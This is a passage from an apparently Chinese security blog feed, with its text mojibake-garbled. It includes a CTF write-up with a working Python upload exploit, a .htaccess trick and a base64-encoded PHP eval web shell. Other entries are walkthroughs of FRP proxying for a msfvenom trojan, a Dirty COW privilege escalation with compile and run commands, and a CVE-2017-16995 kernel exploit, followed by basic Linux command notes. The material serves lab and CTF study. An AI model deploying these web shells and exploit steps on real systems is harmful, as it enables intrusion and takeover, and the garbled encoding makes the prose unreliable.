base64htaccess = b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;&quot;&quot;&quot;shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;)#è¿™é‡Œçš„GIF8912åé¢çš„12æ˜¯ä¸ºäº†ç¬¦åˆbase64 8ä¸ªå­—èŠ‚çš„ç¼–ç è§„èŒƒurl = &quot;http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;files = &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image/jpeg&#39;)&#125;data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;&#39;file&#39;:(&#39;shell.ahhh&#39;,shell,&#39;image/jpeg&#39;)&#125;response = requests.post(url=url, data=data, files=files)print(response.text)</code></pre><p>æœ¬é¢˜phpç¯å¢ƒä¸º7.2ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨<code>&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;shell&#39;]);&lt;/script&gt;</code>è¿™æ¡payload,æ‰€ä»¥å°†shell.haè¿›è¡Œbase64ç¼–ç ä¹‹åï¼Œåœ¨.htaccessæ–‡ä»¶ä¸­åˆ©ç”¨filter://åè®®å°†æ–‡ä»¶è§£ç ï¼Œä»è€Œè¾¾åˆ°ä¼ å…¥shellçš„ç›®çš„ã€‚</p><p>å¾—åˆ°</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png" alt="image-20220210212049717"></p><p>2ã€</p><pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;def generate_php_file(filename, script):    phpfile = open(filename, &#39;wb&#39;)     phpfile.write(script.encode(&#39;utf-16be&#39;))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open(&#39;.htaccess&#39;, &#39;wb&#39;)    htaccess.write(SIZE_HEADER)    htaccess.write(b&#39;AddType application/x-httpd-php .lethe\n&#39;)    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)    htaccess.write(b&#39;php_value display_errors 1\n&#39;)    htaccess.close()        generate_htacess()generate_php_file(&quot;shell.lethe&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); die(); ?&gt;&quot;)</code></pre><p>åŒç†ä¸Šä¼ å³å¯</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png" alt="image-20220210212639842"></p><p>ä¸€å¥è¯æœ¨é©¬æˆåŠŸåˆ©ç”¨ã€‚</p><p>ä½¿ç”¨èšå‰‘æˆåŠŸè¿æ¥</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png" alt="image-20220210212824536"></p><p>ä½†æ˜¯æ— æ³•è®¿é—®æ ¹ç›®å½•ã€‚</p><p>éé¢„æœŸè§£ï¼š</p><p>é‡‡ç”¨èšå‰‘è‡ªå¸¦æ’ä»¶è¿›è¡Œç»•è¿‡.</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png" alt="image-20220210213427872"></p><p>é¢„æœŸè§£ï¼š</p><p>ç»•è¿‡open_basedir</p><p>è¿™é‡Œç”±äºæ¶‰åŠçš„å†…å®¹æˆ‘è¿˜ä¸å¤ªç†è§£ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æ”¾å‡ºpayloadï¼Œæœ‰å…´è¶£çš„å¤§ä½¬å¯ä»¥æ·±å…¥ç ”ç©¶ä¸€ä¸‹ã€‚</p><pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png" alt="image-20220210214135619"></p><p>æ‰€æœ‰æ–‡ä»¶è¢«åˆ—ä¸¾å‡ºæ¥äº†ï¼Œä¸‹é¢è¯»å–flagå€¼å°±å¯ä»¥äº†ã€‚</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png" alt="image-20220210214447849"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¨ªå‘ä»£ç†ä¹‹FRP</title>
      <link href="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/"/>
      <url>/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/</url>
      
        <content type="html"><![CDATA[<p>Frpå·¥å…·ï¼šå¼€æºå…è´¹ï¼Œè‡ªè¡Œæ­å»ºï¼Œæ–¹ä¾¿ä¿®æ”¹ï¼Œæˆæœ¬ä½ï¼Œä½¿ç”¨å¤šæ ·åŒ–ï¼Œé˜²æ­¢éšç§æ³„éœ²ã€‚</p><p>å·¥å…·é“¾æ¥ï¼š<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>ä½œç”¨:å½“æœ¬æœºå’Œç›®æ ‡æœºå¤„äºä¸åŒå†…ç½‘ï¼Œå€Ÿç”¨ä»£ç†æ¥å®ç°ç”¨æœ¬æœºè¿›è¡Œå†…ç½‘æ”»å‡»ã€‚</p><p>ç¯å¢ƒï¼š</p><p>kali2021(æœ¬æœº)  å†…ç½‘ip:192.168.64.128</p><p>centos7.5(æœåŠ¡å™¨) </p><p>windows server 2008 R2 Ã—64 (ç›®æ ‡æœº)  å†…ç½‘ip:192.168.1.9</p><p>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ä»£ç†?</p><p>ä¸¤ä¸ªä¸åŒçš„å†…ç½‘çš„ä¸»æœºæƒ³è¦é€šè¿‡CSæˆ–è€…MSFç­‰å·¥å…·å®ç°æ§åˆ¶æˆ–è€…é€šè®¯æ˜¯ä¸å¯èƒ½çš„ï¼Œå¿…é¡»è¦å€ŸåŠ©ä»£ç†.</p><p>ä¸ªäººè®¤ä¸ºå…¶æ ¹æœ¬åŸå› å°±åªæœ‰ä¸€ç‚¹ï¼šæ²¡æœ‰ç‹¬ç«‹ä¸”ç¡®å®šçš„å…¬ç½‘ip</p><p>å¦‚æœæ§åˆ¶ç«¯æ˜¯å¤–ç½‘ä¸»æœºï¼Œè¢«æ§ç«¯æ˜¯å†…ç½‘ä¸»æœºï¼Œå°±ç›¸å½“äºæ§åˆ¶ç«¯æœ‰ä¸€ä¸ªå”¯ä¸€çš„IPåœ°å€ï¼ˆæ¯”å¦‚103.12.4.11ï¼‰ï¼Œé€šè¿‡è¿™ä¸ªIPåœ°å€å°±å¯ä»¥æ‰¾åˆ°æ§åˆ¶ç«¯ï¼Œè€Œåœ¨å†…ç½‘çš„è¢«æ§ç«¯ï¼ˆæ¯”å¦‚192.168.23.36ï¼‰ï¼Œä½ é€šè¿‡æ§åˆ¶ç«¯ä¸»åŠ¨å»æ‰¾æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œå› ä¸ºè¿™ä¸ªå†…ç½‘IPåœ°å€å¹¶ä¸æ˜¯å”¯ä¸€çš„ï¼Œå¯èƒ½å¾ˆå¤šå†…ç½‘éƒ½ç”¨äº†è¿™ä¸ªIPåœ°å€ï¼Œä½ æ ¹æœ¬æ²¡æ³•æ‰¾ã€‚æ­¤æ—¶å°±éœ€è¦åå‘è¿æ¥äº†ï¼Œè®©å†…ç½‘çš„è¢«æ§ç«¯ä¸»åŠ¨å»æ‰¾å¤–ç½‘çš„æ§åˆ¶ç«¯ã€‚è€Œæœ¬æœºå’Œç›®æ ‡æœºéƒ½å¤„äºå†…ç½‘ä¹‹ä¸­ï¼Œæ­¤æ—¶å¿…é¡»ä½¿ç”¨ä»£ç†æ¥è¿›è¡Œè¿æ¥ã€‚</p><p>é¦–å…ˆé…ç½®å¥½ç¯å¢ƒï¼Œkaliä¸win2008å¤„äºä¸åŒç½‘æ®µï¼Œä¸”éƒ½å¯è”ç½‘ã€‚(vmä¸­è‡ªè¡Œé…ç½®ï¼Œå¯å°†ä¸€å°ä¸»æœºè‡³äºNATæ¨¡å¼ï¼Œä¸€å°ç½®äºä»…ä¸»æœºï¼Œä½¿ä»…ä¸»æœºå¯è”ç½‘)</p><p>æ£€æµ‹kaliçš„å†…ç½‘ipå’Œç½‘ç»œ</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155315218.png" alt="image-20220119155315218"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155341286.png" alt="image-20220119155341286"></p><p>æ£€æµ‹win2008çš„å†…ç½‘ipå’Œç½‘ç»œ.</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155431599.png" alt="image-20220119155431599"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155453758.png" alt="image-20220119155453758"></p><p>ä¸‹è½½frpåˆ°kaliä¸­</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155729846.png" alt="image-20220119155729846"></p><p>frpc.inié…ç½®æ–‡ä»¶æ˜¯æœåŠ¡ç«¯ï¼Œfrpc.iniæ˜¯å®¢æˆ·ç«¯ï¼Œä¸‹é¢è¿›è¡Œé…ç½®ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆæ‰“å¼€æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œç¼–è¾‘frps.ini</p><p>éšæ„è®¾ç½®ä¸€ä¸ªç«¯å£å·å°±å¥½ã€‚</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119162501013.png" alt="image-20220119162501013"></p><p>å¯åŠ¨æœåŠ¡ç«¯</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119163847158.png" alt="image-20220119163847158"></p><p>æ¥ä¸‹æ¥åœ¨kaliä¸­é…ç½®æ§åˆ¶ç«¯</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164721460.png" alt="image-20220119164721460"></p><p>å¯åŠ¨æ§åˆ¶ç«¯</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164937708.png" alt="image-20220119164937708"></p><p>æ¥ä¸‹æ¥åˆ©ç”¨msfvenomç”Ÿæˆæœ¨é©¬å¼€å¯ç›‘å¬</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171131305.png" alt="image-20220119171131305"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171505986.png" alt="image-20220119171505986"></p><p>å°†æœ¨é©¬ä¸Šçº¿</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171914965.png" alt="image-20220119171914965"></p><p>ç›‘å¬åˆ°ä¼šè¯</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173926936.png" alt="image-20220119173926936"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173948480.png" alt="image-20220119173948480"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119174002938.png" alt="image-20220119174002938"></p><p>æˆåŠŸå®ç°äº†å†…ç½‘ä»£ç†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çº¢é˜Ÿ </category>
          
          <category> ä»£ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxè„ç‰›ææƒ</title>
      <link href="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
      <url>/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>è„ç‰›æ¼æ´ï¼Œåˆå«Dirty COWï¼Œå­˜åœ¨Linuxå†…æ ¸ä¸­å·²ç»æœ‰é•¿è¾¾9å¹´çš„æ—¶é—´ï¼Œåœ¨2007å¹´å‘å¸ƒçš„Linuxå†…æ ¸ç‰ˆæœ¬ä¸­å°±å·²ç»å­˜åœ¨æ­¤æ¼æ´ã€‚Linux kernelå›¢é˜Ÿåœ¨2016å¹´10æœˆ18æ—¥å·²ç»å¯¹æ­¤è¿›è¡Œäº†ä¿®å¤ã€‚</p><p>æ¼æ´èŒƒå›´ï¼šLinuxå†…æ ¸ &gt;= 2.6.22ï¼ˆ2007å¹´å‘è¡Œï¼Œåˆ°2016å¹´10æœˆ18æ—¥æ‰ä¿®å¤ï¼‰</p><p>ç®€è¦åˆ†æï¼šè¯¥æ¼æ´å…·ä½“ä¸ºï¼ŒLinuxå†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™å…¥å¤åˆ¶ï¼ˆcopy-on-write, COWï¼‰æ—¶äº§ç”Ÿäº†ç«äº‰æ¡ä»¶ï¼ˆrace conditionï¼‰ã€‚æ¶æ„ç”¨æˆ·å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ¥è·å–é«˜æƒé™ï¼Œå¯¹åªè¯»å†…å­˜æ˜ å°„è¿›è¡Œå†™è®¿é—®ã€‚ç«äº‰æ¡ä»¶ï¼ŒæŒ‡çš„æ˜¯ä»»åŠ¡æ‰§è¡Œé¡ºåºå¼‚å¸¸ï¼Œå¯å¯¼è‡´åº”ç”¨å´©æºƒï¼Œæˆ–ä»¤æ”»å‡»è€…æœ‰æœºå¯ä¹˜ï¼Œè¿›ä¸€æ­¥æ‰§è¡Œå…¶ä»–ä»£ç ã€‚åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œæ”»å‡»è€…å¯åœ¨å…¶ç›®æ ‡ç³»ç»Ÿæå‡æƒé™ï¼Œç”šè‡³å¯èƒ½è·å¾—rootæƒé™ã€‚</p><p>å¤ç°ï¼š</p><p>ç¯å¢ƒï¼šUbuntu 14.04.5</p><p>é¶åœºä¸‹è½½åœ°å€:<a href="https://www.vulnhub.com/entry/lampiao-1,249/">LampiÃ£o: 1 ~ VulnHub</a></p><p>å¼€å¯kaliï¼Œé¶æœºï¼Œé…ç½®ä½¿å…¶ä½äºåŒä¸€ç½‘æ®µ</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144958930.png" alt="image-20220104144958930"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144854766.png" alt="image-20220104144854766"></p><p>ä½¿ç”¨nmapå¯¹ipæ®µè¿›è¡Œæ‰«æ</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144833775.png" alt="image-20220104144833775"></p><p>å‘ç°å¯ç–‘ip  192.168.64.129</p><p>æ‰“å¼€</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145052541.png" alt="image-20220104145052541"></p><p>æ²¡æœ‰å‘ç°æœ‰ç”¨ä¿¡æ¯ï¼Œå¯¹å…¶ç«¯å£è¿›è¡Œè¿›ä¸€æ­¥æ¢æµ‹</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145423615.png" alt="image-20220104145423615"></p><p>å‘ç° 1898ç«¯å£</p><p>æ‰“å¼€ï¼Œç½‘é¡µå¦‚å›¾</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145547619.png" alt="image-20220104145547619"></p><p>åœ¨åº•éƒ¨å‘ç°cmsä¸ºDrupal</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145621761.png" alt="image-20220104145621761"></p><p>æ¢æµ‹å…¶ç‰ˆæœ¬ä¸º Drupal7</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104150839353.png" alt="image-20220104150839353"></p><p>ç™¾åº¦ä¸€ä¸‹ï¼Œå‘ç°å…¶å­˜åœ¨ è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2018-7600</p><p>æ‰“å¼€msfæœç´¢ç›¸å…³æ¼æ´</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145741167.png" alt="image-20220104145741167"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151550089.png" alt="image-20220104151550089"></p><p>é…ç½®å‚æ•°ï¼Œè¿›è¡Œæ”»å‡»</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151627775.png" alt="image-20220104151627775"></p><p>æˆåŠŸï¼</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151712264.png" alt="image-20220104151712264"></p><p>ä¸‹é¢ä¸Šä¼ æ¼æ´æ£€æµ‹è„šæœ¬è‡³ç›®æ ‡é¶æœº</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104173845980.png" alt="image-20220104173845980"></p><p>èµ‹äºˆæƒé™å¹¶è¿è¡Œ</p><pre><code>shellchmod +x sakuras.sh./sakuras.sh</code></pre><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104174121444.png" alt="image-20220104174121444"></p><p>å‘ç°äº†è„ç‰›æ¼æ´ï¼Œå‡†å¤‡å¼€å§‹ææƒ</p><p>å‡†å¤‡å¥½exp</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192056147.png" alt="image-20220104192056147"></p><p>é“¾æ¥ï¼š<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p><p>ä¸Šä¼  dcow.cppåˆ°é¶æœº </p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192200178.png" alt="image-20220104192200178"></p><p>è¿›è¡Œç¼–è¯‘</p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</code></pre><p>æ‰“å¼€äº¤äº’å¼ç¯å¢ƒ</p><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>è¿è¡Œ</p><pre><code>./dcow</code></pre><p>æˆåŠŸ</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192407007.png" alt="image-20220104192407007"></p><p>æ–°å»ºsshé“¾æ¥ï¼Œæˆ–è€…ç›´æ¥</p><p>su root </p><p>è®°å¾—åˆ‡æ¢ç”¨æˆ·è¦åœ¨äº¤æ¢å¼çª—å£ä¸‹</p><p>æˆåŠŸææƒ</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192533247.png" alt="image-20220104192533247"></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> Linuxææƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxææƒæœ¬åœ°é…åˆå†…æ ¸æ¼æ´æ¼”ç¤º</title>
      <link href="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/"/>
      <url>/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<p>ç¯å¢ƒï¼šUbuntu 16.04(è¿™é‡Œç›´æ¥ä½¿ç”¨å¢¨è€…å­¦é™¢çš„é¶åœº)</p><p>æ¼æ´ç¼–å·ï¼šCVE-2017-16995</p><p>ä½¿ç”¨å·¥å…·: linux-exploit-suggester-2 æ£€æµ‹     ç‰¹å®šexpææƒ</p><p>å·¥å…·é“¾æ¥ï¼š<a href="https://github.com/jondonas/linux-exploit-suggester-2">GitHub - jondonas/linux-exploit-suggester-2: Next-Generation Linux Kernel Exploit Suggester</a></p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104134814506.png" alt="image-20220104134814506"></p><p>åˆ©ç”¨sshå·¥å…·è¿æ¥</p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133116341.png" alt="image-20220104133116341"></p><p>ä¸Šä¼ å·¥å…·ï¼Œå¹¶è¿è¡Œï¼Œå‘ç°æœ‰  CVE-2017-16995 æ¼æ´</p><p> Source: <a href="http://www.exploit-db.com/exploits/45010">http://www.exploit-db.com/exploits/45010</a></p><p>ä¸‹è½½exp</p><p>å¾—åˆ°45010.c</p><p>ä¸Šä¼ åˆ°æœåŠ¡å™¨/tmpç›®å½•</p><p>ç¼–è¯‘æ‰§è¡Œ</p><pre><code>gcc 45010.c -o 455010chmod +x 455010./ 455010</code></pre><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133424470.png" alt="image-20220104133424470"></p><p>æˆåŠŸææƒï¼</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> Linuxææƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2021/11/12/Linux/"/>
      <url>/2021/11/12/Linux/</url>
      
        <content type="html"><![CDATA[<h1 id="äº†è§£Linuxæ“ä½œç³»ç»ŸåŠå®‰è£…æ–¹å¼"><a href="#äº†è§£Linuxæ“ä½œç³»ç»ŸåŠå®‰è£…æ–¹å¼" class="headerlink" title="äº†è§£Linuxæ“ä½œç³»ç»ŸåŠå®‰è£…æ–¹å¼"></a>äº†è§£Linuxæ“ä½œç³»ç»ŸåŠå®‰è£…æ–¹å¼</h1><p><img src="/2021/11/12/Linux/image-20211112001054678.png" alt="image-20211112001054678"></p><p><img src="/2021/11/12/Linux/image-20211112001133176.png" alt="image-20211112001133176"></p><p><img src="/2021/11/12/Linux/image-20211112002049844.png" alt="image-20211112002049844"></p><p><img src="/2021/11/12/Linux/image-20211112002148742.png" alt="image-20211112002148742"></p><p><img src="/2021/11/12/Linux/image-20211112002405780.png" alt="image-20211112002405780"></p><h1 id="æŒæ¡åŸºç¡€å‘½ä»¤ã€ç”¨æˆ·å¸å·ç®¡ç†ã€ç›®å½•å’Œæ–‡ä»¶ç®¡ç†"><a href="#æŒæ¡åŸºç¡€å‘½ä»¤ã€ç”¨æˆ·å¸å·ç®¡ç†ã€ç›®å½•å’Œæ–‡ä»¶ç®¡ç†" class="headerlink" title="æŒæ¡åŸºç¡€å‘½ä»¤ã€ç”¨æˆ·å¸å·ç®¡ç†ã€ç›®å½•å’Œæ–‡ä»¶ç®¡ç†"></a>æŒæ¡åŸºç¡€å‘½ä»¤ã€ç”¨æˆ·å¸å·ç®¡ç†ã€ç›®å½•å’Œæ–‡ä»¶ç®¡ç†</h1><p>å‘½ä»¤ï¼š</p><p>uname -a  æ˜¾ç¤ºä¸»æœºåã€å†…æ ¸ç‰ˆæœ¬ã€ç¡¬ä»¶å¹³å°ç­‰è¯¦ç»†ä¿¡æ¯ </p><p>uname -r æ˜¾ç¤ºå†…æ ¸ç‰ˆæœ¬</p><p>cat /etc/os-release æŸ¥çœ‹ç‰ˆæœ¬å·</p><p>hostname æ˜¾ç¤ºå…¨åˆæ ¼ä¸»æœºå</p><p>cat /proc/cpuinfo  æŸ¥çœ‹cpuä¿¡æ¯ æˆ–è€…lscpu</p><p>cat /proc/meminfo æŸ¥çœ‹å†…å­˜ä¿¡æ¯  æˆ–è€…free</p><p>å…³æœº poweroff   shutdown -h now</p><p>é‡å¯ reboot  shutdown -r now </p><p>Linuxå‘½ä»¤</p><p>ç”¨äºå®ç°æŸä¸€ç±»åŠŸèƒ½çš„æŒ‡ä»¤æˆ–è€…ç¨‹åº</p><p>å‘½ä»¤çš„æ‰§è¡Œä¾èµ–äºè§£é‡Šå™¨ç¨‹åº(ä¾‹å¦‚ï¼š/bin/bash)</p><p>Linux å‘½ä»¤çš„åˆ†ç±»</p><p>å†…éƒ¨å‘½ä»¤ï¼šå±äºshellè§£é‡Šå™¨çš„ä¸€éƒ¨åˆ†</p><p>å³å‘½ä»¤åŒ…å«åœ¨shellç¨‹åºæœ¬èº«ä¹‹ä¸­ï¼Œä¾‹å¦‚â€historyâ€å‘½ä»¤</p><p>å¤–éƒ¨å‘½ä»¤ï¼šç‹¬ç«‹äºshellè§£é‡Šå™¨ä¹‹å¤–çš„ç¨‹åºæ–‡ä»¶ã€‚</p><p>å¦‚ä½•åˆ¤æ–­æ˜¯å¤–éƒ¨å‘½ä»¤è¿˜æ˜¯å†…éƒ¨ï¼Ÿ</p><p>ä½¿ç”¨ï¼š</p><p>which xx</p><p>å¦‚æœå¯ä»¥æœç´¢åˆ°ä¸ºå¤–éƒ¨ï¼Œä¸èƒ½åˆ™ä¸ºå†…éƒ¨</p><p>è¿™ä¸ªæ–¹æ³•ä¹Ÿç”¨æ¥æŸ¥æ‰¾å¤–éƒ¨å‘½ä»¤çš„è·¯å¾„</p><p>å¦‚ï¼š</p><p>[root@o213 ~]# which ls<br>/usr/bin/ls</p><p>type  xx äº†è§£ä¸€äº›å‘½ä»¤çš„ä¿¡æ¯</p><p>å¦‚ï¼š</p><p>[root@o213 ~]# type ls<br>ls æ˜¯â€œls â€“color=autoâ€çš„åˆ«å</p><p><img src="/2021/11/12/Linux/image-20211112233035921.png" alt="image-20211112233035921"></p><p>å‘½ä»¤è¡Œç¼–è¾‘çš„å‡ ä¸ªè¾…åŠ©æ“ä½œ</p><p>Tab ï¼šè‡ªåŠ¨è¡¥é½</p><p>åæ–œæ  \ :å¼ºåˆ¶æ¢è¡Œ</p><p>Ctrl+U :æ¸…ç©ºè‡³è¡Œé¦–</p><p>Ctrl+K :æ¸…ç©ºè‡³è¡Œå°¾</p><p>Ctrl+Lï¼šæ¸…å±</p><p>Ctrl+C:å–æ¶ˆæœ¬æ¬¡å‘½ä»¤ç¼–è¾‘</p><p>å†…éƒ¨å‘½ä»¤help</p><p>æŸ¥çœ‹Bashå†…éƒ¨å‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯</p><p>å‘½ä»¤çš„ â€œâ€“helpâ€ é€‰é¡¹</p><p>é€‚ç”¨äºå¤§å¤šæ•°å¤–éƒ¨å‘½ä»¤</p><p>adduser æ·»åŠ ç”¨æˆ·è´¦å·</p><p>passwd è®¾ç½®(æ›´æ”¹)ç”¨æˆ·å£ä»¤</p><p>userdel åˆ é™¤ç”¨æˆ·è´¦å·(åŠå®¿ä¸»ç›®å½•)</p><p>usermod è®¾ç½®ç”¨æˆ·å±æ€§</p><p> [root@o213 ~]# adduser admin  